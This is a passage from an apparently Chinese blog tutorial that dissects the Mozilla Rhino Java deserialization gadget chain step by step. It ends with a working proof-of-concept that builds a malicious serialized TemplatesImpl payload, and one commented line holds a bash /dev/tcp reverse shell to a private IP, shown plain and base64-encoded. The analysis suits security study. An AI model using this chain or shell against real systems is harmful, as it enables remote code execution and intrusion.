在分析此攻击链之前，你得需要知道`TemplatesImpl`这个类，如果你还并不是很了解的话可以直接阅读我的这篇文章[详解TemplatesImpl](../详解TemplatesImpl/main.md)

当`TemplatesImpl`中的字段被构造为恶意代码时，然后触发`getOutputProperties`或`newTransformer`这两个方法中的任意一个即可导致恶意代码执行。

该攻击链对JDK版本无限制，我这里用的是JDK8u421。

```xml
<!-- https://mvnrepository.com/artifact/rhino/js -->
<dependency>
    <groupId>rhino</groupId>
    <artifactId>js</artifactId>
    <version>1.7R2</version>
</dependency>
```

当你看完所有攻击链中的代码分析后，我推荐你先调试POC-1，这个payload是我基于ysoserial中的攻击链改造过来的，和我前边讲的内容是比较贴切的。ysoserial中的攻击链写的是比较冗余的，会把人给绕晕.....，虽然实际上他们的原理是基本一致的。

## MemberBox

`MemberBox` 类是 **Mozilla Rhino JavaScript 引擎**（Java实现）中的关键组件，主要用于包装 Java 方法、构造函数和字段，以便在 JavaScript 环境中调用。

在MemberBox中包含了一段代码，如下

```java
final class MemberBox implements Serializable {
    private transient Member memberObject;
    // 在构造方法中允许一个Method类型的对象作为参数
    MemberBox(Method method) {
        // 调用init方法
        init(method);
    }
    private void init(Method method) {
        // 在init方法中，把method赋值给memberObject这个Member类型的变量
        // 因为Method实现了Member这个接口，所以这个转换是成立的
        // 同时Method被转换为Member类型之后，还可以再通过Member类型强转回来，这个在invoke方法中有用到
        // 这是Java面向对象的特性
        this.memberObject = method;
        // 记着这个字段，后边也会用到
        // 这个字段就是一个 Class<?>[]，其中存储了method中的参数列表的Class信息
        this.argTypes = method.getParameterTypes();
        this.vararg = VMBridge.instance.isVarArgs(method);
    }
    
    Object invoke(Object target, Object[] args) {
        // 调用method方法获取了一个Method方法
        Method method = method();
        try {
            try {
                // 调用memberObject成员变量的invoke方法
                // 在这里如果memberObject成员变量是我们构造的恶意类，那么就能导致任意代码执行
                return method.invoke(target, args);
            } catch (IllegalAccessException ex) {
                ......
            }
        } catch (InvocationTargetException ite) {
            ......
        }
    }

    Method method() {
        // 把Member对象转换为Method类型
        // 我也不知道为啥这个库要这么转换，可能是其他地方有用到Member吧，虽然很奇怪，但是他的代码就是这么写的
    	return (Method)memberObject;
    }
}
```

上边的代码中有一个关键点，就是`memberObject`这个成员变量是使用`transient`关键字进行修饰的，而使用这个关键字修饰的成员变量默认情况下是不参与序列化和反序列化的。但是在这个类中重写了`memberObject`，导致该字段可以被序列化和反序列化。

关键代码如下：

```java
// 序列化时执行的方法
private void writeObject(ObjectOutputStream out) throws IOException {
    // 执行默认序列化操作，将普通字段序列化进二进制流中
    out.defaultWriteObject();
    // 调用writeMember方法，将memberObject写入到二进制流中
    writeMember(out, memberObject);
}
private static void writeMember(ObjectOutputStream out, Member member) throws IOException {
    if (member == null) {
        out.writeBoolean(false);
        return;
    }
    // 写入一个true作为标识符，标识着调用了自定义的writeMember方法
    out.writeBoolean(true);
    // 如果memberObject成员变量既不是Method也不是Constructor就抛出异常
    // 但是很显然，这里的memberObject我们可以控制
    // 而且默认情况下memberObject就是Method的
    if (!(member instanceof Method || member instanceof Constructor))
        throw new IllegalArgumentException("not Method or Constructor");
    // true -> 因为默认就是Method类型的
    out.writeBoolean(member instanceof Method);
    // Method的name字段就对应着要调用的方法名
    // 比如这里如果指定的Method是getOutputProperties()，那么name就等于getOutputProperties
    out.writeObject(member.getName());
    // Method指向的Class信息
    // 比如这里的Method指向了TemplatesImpl，那DeclaringClass就是TemplatesImpl的Class对象
    out.writeObject(member.getDeclaringClass());
    if (member instanceof Method) {
        // 将对应的参数也写入到二进制流中
        writeParameters(out, ((Method) member).getParameterTypes());
    } else {
        writeParameters(out, ((Constructor<?>) member).getParameterTypes());
    }
}
// 反序列化时执行的方法
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
    // 默认反序列化方法
    in.defaultReadObject();
    // 调用readMember方法
    Member member = readMember(in);
    // 根据前边的逻辑，我们知道当
    if (member instanceof Method) {
        // 这里从二进制流中读取
        init((Method)member);
    } else {
        init((Constructor<?>)member);
    }
}

private static Member readMember(ObjectInputStream in) throws IOException, ClassNotFoundException {
    // 先读取是否调用了自定义的readMember方法
    if (!in.readBoolean())
        return null;
    // 如果isMethod = true，这里就是Method
    // 默认情况下这里的isMethod一定等于true
    boolean isMethod = in.readBoolean();
    // 把Method方法名读出来
    String name = (String) in.readObject();
    // 把Method对应的Class对象读出来
    // 
    Class<?> declaring = (Class<?>) in.readObject();
    // 把对应的参数都读出来
    Class<?>[] parms = readParameters(in);
    try {
        // isMethod = true
        if (isMethod) {
            // 从Class对象中把方法名为 name、parms的Method对象读取出来
            // 如果name=getOutputProperties、parms=new Object[]
            // 那么就能获得一个TemplatesImpl中的getOutputProperties的Method对象
            return declaring.getMethod(name, parms);
        } else {
            return declaring.getConstructor(parms);
        }
    } catch (NoSuchMethodException e) {
        throw new IOException("Cannot find member: " + e);
    }
}
```

OK，MemberBox的所有关键代码我们就跟完了，接着就是需要看哪里会调用invoke方法。

## NativeJavaMethod

其中`NativeJavaMethod`中的关键代码如下

```java
public class NativeJavaMethod extends BaseFunction {
    MemberBox[] methods;
    private String functionName;
    
    @Override
    public Object call(Context cx, Scriptable scope, Scriptable thisObj,
                       Object[] args)
    {
        // Find a method that matches the types given.
        if (methods.length == 0) {
            throw new RuntimeException("No methods defined for call");
        }
		// 从methods数组中找到匹配args参数列表的index
        int index = findFunction(cx, methods, args);
        ......
		// 取出这个匹配的MemberBox对象
        MemberBox meth = methods[index];
        // 同时取出MemberBox中的参数列表的Class对象
        Class<?>[] argTypes = meth.argTypes;
        // 这一段代码在处理MemberBox中的参数，和我们后续的研究关系不大，所以这里就忽略了
        if (meth.vararg) {
            ......
        } else {
        	......
        }
        Object javaObject;
        // 判断MemberBox(Method)是否是静态的，对应着下边的代码实现，其实就是在判断Method对象是否被static修饰
        // boolean isStatic() { return Modifier.isStatic(memberObject.getModifiers()); }
        if (meth.isStatic()) {
            // 如果这是一个static修饰的方法，则不需要对应的实例就能调用，所以javaObject=null
            javaObject = null;  // don't need an object
        } else {
            // 目前还不知道thisObj是个什么东西，但是是个Scriptable的实现类
            Scriptable o = thisObj;
            // 获取meth的Class对象，这里如果构造了TemplatesImpl恶意类，那么c就等于Class<TemplatesImpl>
            Class<?> c = meth.getDeclaringClass();
            for (;;) {
                // 先假设这个o我们是可控的，所以这个if条件导致的异常我们是不会触发的
                if (o == null) {
                    throw Context.reportRuntimeError3(
                        "msg.nonjava.method", getFunctionName(),
                        ScriptRuntime.toString(thisObj), c.getName());
                }
                // 如果o是一个继承或实现了Wrapper接口的类
                if (o instanceof Wrapper) {
                    // 调用o的unwrap方法，从这个方法中获取一个Object对象
                    // OK，如果这段代码我们可以利用的话，需要的前提是：
                    // o实现了Wrapper和Scriptable这两个类
                    // 我们需要找到一个符合这个条件的类
                    javaObject = ((Wrapper)o).unwrap();
                    // 如果javaObject是Class<TemplatesImpl>的实现类，那么就直接退出
                    // 很显然这是我们想要的逻辑
                    if (c.isInstance(javaObject)) {
                        break;
                    }
                }
                // 如果o不是Wrapper接口的实现类，那么就调用o.getPrototype()方法获取一个实现了Scriptable接口的对象
                o = o.getPrototype();
            }
        }
		// 在这里把找到的javaObject实例和对应需要的参数传给MemberBox的invoke方法，就和上边提到的逻辑接起来了。
        Object retval = meth.invoke(javaObject, args);
        // 后边的逻辑就不需要关注了。
        ......
    }
}

```

NativeJavaMethod是一个继承了`BaseFunction`的类，其中`BaseFunction`的继承关系又如下：

```java
public class BaseFunction extends IdScriptableObject implements Function
```

这里继承了一个Function接口，其中Function的接口定义如下：

```java
public interface Function extends Scriptable, Callable {
    // 这个是我们需要关注的方法，在NativeJavaMethod中重写了这个方法，导致可以任意方法调用
    public Object call(Context cx, Scriptable scope, Scriptable thisObj,
                       Object[] args);
    public Scriptable construct(Context cx, Scriptable scope, Object[] args);
}
```

OK，现在看起来我们找到了一个非常符合Memerbox调用条件的方法，现在需要的是找到一个同时实现了`Wrapper和Scriptable`这两个接口的类。

或者说我们要找到一个Scriptable接口的实现类，同时该类的`getPrototype()`可以获取到一个同时实现了`Wrapper和Scriptable`这两个接口的类。

同时我们还需要找到一个调用call方法的类，一个一个来，先找实现了`Wrapper和Scriptable`这两个接口的类。

这里再补充一段代码，这是`NativeJavaMethod`中的两个构造方法，这对后边构造POC是有意义的，我们不需要手动去创建MemberBox对象，而是直接使用NativeJavaMethod的构造方法就行了。

```java
public class NativeJavaMethod extends BaseFunction {
    static final long serialVersionUID = -3440381785576412928L;

    NativeJavaMethod(MemberBox method, String name) {
        this.functionName = name;
        this.methods = new MemberBox[] { method };
    }
    
    public NativeJavaMethod(Method method, String name) {
        this(new MemberBox(method), name);
    }
    ......
}

```

## NativeJavaObject

这个类的逻辑就很直白了，直接调用unwarp方法就返回了一个Object对象。但是需要注意的是这里的Object是使用`transient` 关键字修饰的，所以需要看一下在`writeObject`方法和`readObject`方法中有没有对应的重写逻辑。

要注意这里的主要目的是把javaObject这个对象变成一个TemplatesImpl对象，这样即可满足我们需要的逻辑。

```java
public class NativeJavaObject implements Scriptable, Wrapper, Serializable {
    protected transient Object javaObject;
    private transient boolean isAdapter;
     public Object unwrap() {
        return javaObject;
    }
    // 重写的writeObject方法
    private void writeObject(ObjectOutputStream out) throws IOException {
        // 调用默认序列化方法
        out.defaultWriteObject();
        // 写入isAdapter的值，isAdapter的值我们是可控的
        out.writeBoolean(isAdapter);
        // 这里边的逻辑有点奇怪，会去调用adapter_writeAdapterObject这个东西，和我们需要的逻辑不那么符合，所以这里要控制isAdapter == false，这样更方便后续的利用
        if (isAdapter) {
            if (adapter_writeAdapterObject == null) {
                throw new IOException();
            }
            Object[] args = { javaObject, out };
            try {
                adapter_writeAdapterObject.invoke(null, args);
            } catch (Exception ex) {
                throw new IOException();
            }
        } else {
            // 当isAdapter==false时，写入javaObject对象，这就很符合我们想要的逻辑了。
            out.writeObject(javaObject);
        }
		// 如果staticType不为空，则把staticType的类名写入到序列化流中
        if (staticType != null) {
            out.writeObject(staticType.getClass().getName());
        } else {
            // 否则将null写入到序列化流中
            out.writeObject(null);
        }
    }
    // 重写的readObject方法
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        // 调用默认反序列化方法
        in.defaultReadObject();
        // 解析isAdapter字段，在writeObject中这个字段我们是可控的
        isAdapter = in.readBoolean();
        // 我们不想让其走到这个位置，所以在writeObject方法中控制isAdapter==false
        if (isAdapter) {
            if (adapter_readAdapterObject == null)
                throw new ClassNotFoundException();
            Object[] args = { this, in };
            try {
                javaObject = adapter_readAdapterObject.invoke(null, args);
            } catch (Exception ex) {
                throw new IOException();
            }
        } else {
            // 当isAdapter==false时，从中加载到Object对象
            // 当写入恶意代码时，可以从中取出TemplatesImpl对象
            javaObject = in.readObject();
        }

        String className = (String)in.readObject();
        if (className != null) {
            staticType = Class.forName(className);
        } else {
            staticType = null;
        }
		// 初始化其他字段，这里和我们的攻击代码构造关系不大
        initMembers();
    }
}
```

`NativeJavaObject`是`public`的，我们可以直接访问，同时它也存在以下构造方法，这能让我们很方便的构造poc：

```java
public class NativeJavaObject implements Scriptable, Wrapper, Serializable
{
    static final long serialVersionUID = -6948590651130498591L;

    public NativeJavaObject() { }

    // 调用该构造方法
    // 这里只需要填充scope、javaObject这两个字段即可，我们其实用到的只有javaObject而已
    // 但是不填充scope会导致初始化流程报错
    public NativeJavaObject(Scriptable scope, Object javaObject,
                            Class<?> staticType) {
        this(scope, javaObject, staticType, false);
    }

    public NativeJavaObject(Scriptable scope, Object javaObject,
                            Class<?> staticType, boolean isAdapter) {
        this.parent = scope;
        this.javaObject = javaObject;
        this.staticType = staticType;
        this.isAdapter = isAdapter;
        // initMembers方法中用到scope来初始化其他内容，所以scope不能为null，这里需要一个Scriptable对象
        initMembers();
    }
    // 初始化一些其他字段，不用特别关心里边的逻辑
    protected void initMembers() {
        Class<?> dynamicType;
        if (javaObject != null) {
            dynamicType = javaObject.getClass();
        } else {
            dynamicType = staticType;
        }
        members = JavaMembers.lookupClass(parent, dynamicType, staticType, 
                                          isAdapter);
        fieldAndMethods
            = members.getFieldAndMethodsObjects(this, javaObject, false);
    }
}
```

OK，`NativeJavaObject`这个类满足前边说的`unwarp`方法的需要。

现在需要的是：

* 有什么类实现了Scriptable接口，同时这个类的`getPrototype()`方法可以返回一个实现了`Wrapper和Scriptable`这两个接口的类。
* 创建一个`Scriptable`的实现类，用来填充`scope`字段

## ScriptableObject

这是一个抽象类，该抽象类的接口定义如下：

```java
public abstract class ScriptableObject implements Scriptable, Serializable,
                                                  DebuggableObject,
                                                  ConstProperties {
	......
}
```

在`Rhino`中，该方法可以用来创建一个基础的`ScriptableObject`对象：

```
Context.enter().initStandardObjects()
```

所以对于上边的`创建一个Scriptable的实现类，用来填充scope字段`，直接使用该方法创建一个基础的`ScriptableObject`对象即可。

### getPrototype

代码如下：

```java
public abstract class ScriptableObject implements Scriptable, Serializable,
                                                  DebuggableObject,
                                                  ConstProperties{
	private Scriptable prototypeObject;
	public Scriptable getPrototype() {
        return prototypeObject;
    }
}

```

这个方法是很单纯的，就是直接返回prototypeObject字段，所以只要能创建一个`ScriptableObject`对象并且控制其中的`prototypeObject`字段即可。

直到这里`NativeJavaMethod.call`方法中的逻辑我们就可控了，现在就需要找到一个调用了call方法的地方。

### call

在`ScriptableObject`中的`getImpl`方法中调用了`Function`接口下的`call`方法，代码如下：

```java
public abstract class ScriptableObject implements Scriptable, Serializable,
                                                  DebuggableObject,
                                                  ConstProperties{
    private static final int SLOT_QUERY = 1;
    public Object get(String name, Scriptable start) {
        return getImpl(name, 0, start);
    }
    // 在getImpl方法中调用了Function.call方法
    // 注意这里的start参数就是我们需要传递的Memberbox
    private Object getImpl(String name, int index, Scriptable start) {
        // 调用getSlot方法，得到一个Slot类型的对象
        Slot slot = getSlot(name, index, SLOT_QUERY);
        if (slot == null) {
            return Scriptable.NOT_FOUND;
        }
        if (!(slot instanceof GetterSlot)) {
            return slot.value;
        }
        // 把Slot类型转换成了GetterSlot类型，同时获取了GetterSlot中的getter字段
        Object getterObj = ((GetterSlot)slot).getter;
        if (getterObj != null) {
            // 感觉这里应该也能直接触发MemberBox中的逻辑，而不用兜这么一大圈子
            if (getterObj instanceof MemberBox) {
                MemberBox nativeGetter = (MemberBox)getterObj;
                Object getterThis;
                Object[] args;
                // 好吧，不太行，因为delegateTo这个参数的定义是：transient Object delegateTo;
                // 而且在writeObject中没有对这个字段做特殊处理，所以无法正常序列化，这个参数我们就不可控了
                if (nativeGetter.delegateTo == null) {
                    getterThis = start;
                    args = ScriptRuntime.emptyArgs;
                } else {
                    getterThis = nativeGetter.delegateTo;
                    args = new Object[] { start };
                }
                return nativeGetter.invoke(getterThis, args);
            } else {
                // 把getter字段又转换成了Function接口类型，所以getterObject可以是实现了Function接口的一个类
                Function f = (Function)getterObj;
                Context cx = Context.getContext();
                // 在这里调用了Function.call方法
                return f.call(cx, f.getParentScope(), start,
                              ScriptRuntime.emptyArgs);
            }
        }
        ......
    }
}
```

好的地方是，我们前边提到的`NativeJavaMethod`实现了`BaseFunction`类，而这个类又实现了`Function`接口，所以`GetterSlot`中的`getter`字段刚好可以被我们利用。

这里有三点我们还不明确，分别是：

* `Slot`我们还不知道是个什么类
* `GetterSlot`和`Slot`这两个类的关系是什么
* `getSlot`方法中的逻辑是什么，能不能被控制

因为`GetterSlot`是从`getSlot`方法中获取的，所以现在就需要看下这两个类究竟是什么。

### Slot

这里单看类看不出什么东西，就是个普通类，重写了`Serializable`接口。还是Google一下吧，下边是Google给的一些解释。

在 Rhino 里，`Slot` 主要用于 **JavaScript 对象属性的存储和管理**，它是 Rhino 解释器中的 `ScriptableObject` 处理 JavaScript 变量的基础组件。例如

* Rhino 允许 JavaScript 代码动态地添加、修改和删除对象的属性，而 `Slot` 作为属性存储的抽象结构，管理这些操作。
* `Slot` 代表 JavaScript 对象的一个字段（类似于 Java 的 `Map.Entry`），用于维护 **JavaScript 对象的属性名、属性值、访问权限等信息**。
* 由于 JavaScript 是动态语言，`Slot` 结构可以存储多种数据类型，并支持 **属性的动态查找和修改**。

好吧，和咱们研究它也关系不太大，了解即可，主要就看一下这个类中大概有啥东西就行。

```java
private static class Slot implements Serializable {
    private static final long serialVersionUID = -6090581677123995491L;
    String name; // This can change due to caching
    int indexOrHash;
    private volatile short attributes;
    transient volatile boolean wasDeleted;
    volatile Object value;
    transient volatile Slot next; // next in hash table bucket
    transient volatile Slot orderedNext; // next in linked list

    Slot(String name, int indexOrHash, int attributes)
    {
        this.name = name;
        this.indexOrHash = indexOrHash;
        this.attributes = (short)attributes;
    }

    private void readObject(ObjectInputStream in)
        throws IOException, ClassNotFoundException
    {
        in.defaultReadObject();
        if (name != null) {
            indexOrHash = name.hashCode();
        }
    }

    final int getAttributes()
    {
        return attributes;
    }

    final synchronized void setAttributes(int value)
    {
        checkValidAttributes(value);
        attributes = (short)value;
    }
}
```

### GetterSlot

这里的逻辑还是比较单纯的，准确来说是也太简单了，可以看到就是自己包含了两个`Object`类型的字段，同时调用`Slot`中的构造方法。

还是Google一下这个类是干嘛的吧：

`GetterSlot` 是 `Slot` 的一个子类，它的主要作用是在 Rhino 解析器中 **支持 JavaScript 访问器（getter 和 setter）**，使 JavaScript 对象能够使用类似 `Object.defineProperty` 方式定义 **属性访问方法**。

```java
private static final class GetterSlot extends Slot {
    static final long serialVersionUID = -4900574849788797588L;
    Object getter;
    Object setter;
    GetterSlot(String name, int indexOrHash, int attributes)
    {
        super(name, indexOrHash, attributes);
    }
}
```

那此时我们就知道这两个类的作用了，非常单纯的类。然后我们需要再看一下`getSlot`这个方法中的逻辑

### getSlot

这个代码如下：

```java
private Slot getSlot(String name, int index, int accessType) {
    Slot slot;
    // 检查最近访问缓存 (lastAccessCheck 块)
  lastAccessCheck: {
    // lastAccess 是一个缓存变量，存储 上一次成功访问的 Slot
        slot = lastAccess;
        // 如果name非空
        if (name != null) {
            // 如果 name 和 slot.name 不是同一个对象引用，就退出缓存检查。
            // 这里用的是 引用比较 (!=) 而不是 equals()，因为 Rhino 内部 保证相同属性的 String 引用始终相同
            if (name != slot.name)
                break lastAccessCheck;
        } else {
            // 如果name参数为空时
            // slot.name 必须为空，并且 slot.indexOrHash 需要匹配 index，否则退出缓存检查。
            if (slot.name != null || index != slot.indexOrHash)
                break lastAccessCheck;
        }
        // 如果 slot.wasDeleted == true，说明这个Slot已经被删除，缓存失效，退出缓存检查。
        if (slot.wasDeleted)
            break lastAccessCheck;
		// 如果访问类型是 修改 getter/setter (SLOT_MODIFY_GETTER_SETTER)，但 slot 不是 GetterSlot，缓存失效。
        if (accessType == SLOT_MODIFY_GETTER_SETTER && !(slot instanceof GetterSlot))
            break lastAccessCheck;
      // 经过所有检查，如果 slot 仍然有效，直接返回
        return slot;
    }
	// 如果缓存不命中，就调用 accessSlot 进行正常查询
    slot = accessSlot(name, index, accessType);
    // 更新缓存
    if (slot != null) {
        lastAccess = slot;
    }
    // 返回slot
    return slot;
}
```

accessSlot中的逻辑有点复杂，不理解这里边的逻辑我觉得也问题不大，毕竟这是个数据结构的实现。

其实就是比如name="hello"，然后调用getSlot("hello", 0, 1)时，就能把"hello"对应的对象返回回来。和`HashTable`或者`HashMap`的实现有相似的效果。

现在在`ScriptableObject`中提到的三点不明确的地方，现在都清楚了，因为在`ScriptableObject.get(String,Scriptable)`中调用了`getImpl`方法，所以这里就是需要找看哪个地方调用`ScriptableObject.get(String,Scriptable)`方法了。

### IdScriptableObject

这个类是`ScriptableObject`的实现类，在这个类中调用了`ScriptableObject.get(String,Scriptable)`方法，关键代码如下：

```java

public abstract class IdScriptableObject extends ScriptableObject implements IdFunctionCall {
    @Override
    public Object get(String name, Scriptable start) {
        int info = findInstanceIdInfo(name);
        if (info != 0) {
            int id = (info & 0xFFFF);
            return getInstanceIdValue(id);
        }
        if (prototypeValues != null) {
            int id = prototypeValues.findId(name);
            if (id != 0) {
                return prototypeValues.get(id);
            }
        }
        // 这里的super其实就是ScriptableObject
        // 默认情况下就会调用到这里，上边的两个条件语句默认情况下是无法命中的
        return super.get(name, start);
    }
}
```

然后找看哪里调用到了`IdScriptableObject.get(String, Scriptable)`方法

### getProperty

```java
public static Object getProperty(Scriptable obj, String name) {
    Scriptable start = obj;
    Object result;
    do {
        // 这里调用到了ScriptableObject的get方法
        // 但是因为IdScriptableObject是ScriptableObject的子类，所以这里就会调用到ScriptableObject的get方法
        result = obj.get(name, start);
        if (result != Scriptable.NOT_FOUND)
            break;
        obj = obj.getPrototype();
    } while (obj != null);
    return result;
}
```

然后继续找哪个地方调用了`ScriptableObject.getProperty(Scriptable,String)`方法。

## NativeError

关键代码如下：

```java
final class NativeError extends IdScriptableObject{
    // 在调用toString方法时，会调用js_toString方法，从而导致整个攻击链被执行
    @Override
    public String toString() {
        return js_toString(this);
    }
    // 在自己的js_toString方法中调用了getString，从而触发ScriptableObject.getProperty方法
    private static String js_toString(Scriptable thisObj) {
        return getString(thisObj, "name")+": "+getString(thisObj, "message");
    }

    private static String getString(Scriptable obj, String id) {
        // 这里调用了ScriptableObject.getProperty方法
        Object value = ScriptableObject.getProperty(obj, id);
        if (value == NOT_FOUND) return "";
        return ScriptRuntime.toString(value);
    }
}
```

这里需要注意的是，如何在调用`ScriptableObject.getSlot()`方法之后，能响应一个我们需要的Slot呢？

其实在NativeError中有一个方法，如下：

```java
public void setGetterOrSetter(String name, int index,
                                  Callable getterOrSetter, boolean isSetter) {
    if (name != null && index != 0)
        throw new IllegalArgumentException(name);

    checkNotSealed(name, index);
    // 先从对应的key中获取缓存的Slot引用
    GetterSlot gslot = (GetterSlot)getSlot(name, index,
                                           SLOT_MODIFY_GETTER_SETTER);
    gslot.checkNotReadonly();
    // 如果isSetter==true，那么就设置setter为我们传递过来的getterOrSetter
    if (isSetter) {
        gslot.setter = getterOrSetter;
    } else {
        // 否则就将getter设置为我们传递过来的getterOrSetter
        gslot.getter = getterOrSetter;
    }
    gslot.value = Undefined.instance;
}
```

还记得哪里实现了`Callable`接口吗？没错就是`Function`接口！！

所以这里的调用应该是：

```java
// name="name": 在调用getString(thisObj, "name")时触发
// index=0: 默认值
// nativeJavaMethod: 构造好的TemplatesImpl触发链的NativeJavaMethod对象
// isSetter=false: 让getter字段赋值为NativeJavaMethod对象
nativeErrorObj.setGetterOrSetter("name", 0, nativeJavaMethod, false);
```

直到这里，整个攻击链基本就完整了。

现在需要找一个具备反序列化，同时以toString为入口点的类，这个类在CC链中也出现过就是`BadAttributeValueExpException`。

## BadAttributeValueExpException

代码如下：

```java
public class BadAttributeValueExpException extends Exception   {
	private Object val;
	private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        // 读取到所有的
        ObjectInputStream.GetField gf = ois.readFields();
        // 当val字段为我们精心构造的攻击链时，这里就会取出攻击链中的内容
        Object valObj = gf.get("val", null);
        
        if (valObj == null) {
            val = null;
            // 因为valObj为我们构造的攻击链。所以 valObj instanceof String这个条件肯定是不满足的
        } else if (valObj instanceof String) {
            val= valObj;
            // System.getSecurityManager() 是 Java 标准库中的一个静态方法，用于获取当前应用程序的 安全管理器（Security Manager）。安全管理器是 Java 安全模型的一部分，主要用于 控制应用程序对敏感操作的访问。
            // 默认情况下System.getSecurityManager() == null，所以这里会触发这个if语句中的逻辑
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            // 在这里会调用Object的toString方法，所以这里是一个绝佳的攻击链入口点
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
    }
}
```

## POC-1

该POC是ysoserial中`MozillaRhino11`攻击链的改进版，原版攻击链真的写的好长，而且挺难理解的，我花了两天的时间也没完全调明白，最后还是在原版的基础上改进了一版代码，就有了下边的POC。

```java
package rhino;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.mozilla.javascript.*;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class MozillaRhino11 {
    private static final String serialFileName = "mozilla_rhino11.ser";
    public static void main(String[] args) throws Exception {
        // 定义要调用的TemplatesImpl中的方法，这里调用getOutputProperties或者newTransformer都行
        Method getOutputProperties = TemplatesImpl.class.getDeclaredMethod("getOutputProperties");
        // 调用NativeJavaMethod的构造方法，在这个构造方法中会自动创建MemberBox对象
        NativeJavaMethod nativeJavaMethod = new NativeJavaMethod(getOutputProperties, "name");
        // 创建NativeJavaObject对象
        NativeJavaObject nativeObject = new NativeJavaObject(Context.enter().initStandardObjects(), genTemplates(), null);

        // 因为NativeError对象不是public的，这里只能通过反射方式获取到Class对象、获取构造方法创建实例
        Class nativeErrorClass = Class.forName("org.mozilla.javascript.NativeError");
        Constructor nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();
        nativeErrorConstructor.setAccessible(true);
        // 创建NativeError对象实例
        IdScriptableObject nativeError = (IdScriptableObject) nativeErrorConstructor.newInstance();
        nativeError.setGetterOrSetter("name", 0, nativeJavaMethod, false);
        nativeError.setPrototype(nativeObject);

        // 创建BadAttributeValueExpException对象，用来触发NativeError中的toString方法
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field valField = badAttributeValueExpException.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(badAttributeValueExpException, nativeError);
		// 模拟本地序列化、反序列化
        serialize(badAttributeValueExpException);
        unSerialize();
    }

    public static void serialize(Object obj)throws Exception {
        FileOutputStream fos = new FileOutputStream(serialFileName);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.flush();
        oos.close();
        fos.close();
    }
    public static void unSerialize() throws Exception {
        // 本地模拟反序列化
        FileInputStream fis = new FileInputStream(serialFileName);
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object ignore = (Object) ois.readObject();
    }

    public static TemplatesImpl genTemplates() throws Exception{
        // bash -c {echo,bash -i >& /dev/tcp/192.168.2.234/4444 0>&1}|{base64,-d}|{bash,-i}
        // bash -c {echo,<base64反弹shell>}|{base64,-d}|{bash,-i}
        // String shellcode = "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMjM0LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}";
        String shellcode = "calc";
        String executeCode = "Runtime.getRuntime().exec(\"" + shellcode + "\");";
        ClassPool pool = ClassPool.getDefault();
        CtClass evil = pool.makeClass("ysoserial.Evil");
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
        evil.makeClassInitializer().insertAfter(executeCode);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        evil.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(AbstractTranslet.class.getName());
        evil.setSuperclass(superC);

        final byte[] classBytes = evil.toBytecode();
        byte[][] trueclassbyte = new byte[][]{classBytes};

        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, trueclassbyte);

        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "Pwnr");

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());

        return templates;
    }
}
```

## POC-ysoserial

```java
package rhino;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.mozilla.javascript.*;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class MozillaRhino1 {
    private static final String serialFileName = "mozilla_rhino1.ser";

    public static void main(String[] args) throws Exception {
        Class nativeErrorClass = Class.forName("org.mozilla.javascript.NativeError");
        Constructor nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();
        nativeErrorConstructor.setAccessible(true);
        IdScriptableObject idScriptableObject = (IdScriptableObject) nativeErrorConstructor.newInstance();
        Context context = Context.enter();

        NativeObject scriptableObject = (NativeObject) context.initStandardObjects();

        Method enterMethod = Context.class.getDeclaredMethod("enter");
        NativeJavaMethod method = new NativeJavaMethod(enterMethod, "name");
        idScriptableObject.setGetterOrSetter("name", 0, method, false);

        Method newTransformer = TemplatesImpl.class.getDeclaredMethod("getOutputProperties");
        NativeJavaMethod nativeJavaMethod = new NativeJavaMethod(newTransformer, "message");
        idScriptableObject.setGetterOrSetter("message", 0, nativeJavaMethod, false);

        Method getSlot = ScriptableObject.class.getDeclaredMethod("getSlot", String.class, int.class, int.class);
        getSlot.setAccessible(true);
        Object slot = getSlot.invoke(idScriptableObject, "name", 0, 1);
        Field getter = slot.getClass().getDeclaredField("getter");
        getter.setAccessible(true);

